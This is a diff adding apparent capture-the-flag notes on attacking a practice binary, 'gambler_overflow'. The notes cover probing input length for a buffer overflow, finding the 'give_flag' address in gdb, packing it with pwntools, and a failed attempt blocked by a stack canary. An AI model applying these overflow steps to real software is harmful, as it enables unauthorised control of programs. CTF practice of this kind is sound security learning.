@@ -1,0 +1,56 @@
+This is still valid
+
+Guess me a string of length 4 with lowercase letters: aaaaaaa
+Your guess: aaaaaaa
+Correct word: fuag
+Bummer, you lost. -10 coins.
+Your current balance: 70
+
+Think this is the number of chars able to call an address
+Guess me a string of length 4 with lowercase letters: aaaaaaaa
+Your guess: aaaaaaaa
+Correct word:
+Bummer, you lost. -10 coins.
+Your current balance: 60
+
+
+This starts overflowing
+Guess me a string of length 4 with lowercase letters: aaaaaaaaa
+Your guess: aaaaaaaaa
+Correct word: a
+
+
+
+#Get address of the function that gives the flag
+(gdb) info functions
+All defined functions:
+Non-debugging symbols:
+0x000000000000156d  give_flag
+
+
+#prep Shellcode
+python3
+>>> from pwn import *
+p64(0x000000000000156d)
+b'm\x15\x00\x00\x00\x00\x00\x00'
+
+Guess me a string of length 4 with lowercase letters: Your guess: b'AAAAAAoclqx15\x00\x00\x00\x00\x00\x00'
+Correct word: oclqx15\x00\x00\x00\x00\x00\x00'
+Bummer, you lost. -10 coins.
+See you next time!
+*** stack smashing detected ***: terminated
+Aborted (core dumped)
+
+Canary detected ??
+
+linux@linux-VirtualBox:~/Documents/boilers$ pwn checksec --file ./gambler_overflow
+[*] '/home/linux/Documents/boilers/gambler_overflow'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+Yeap
+
+
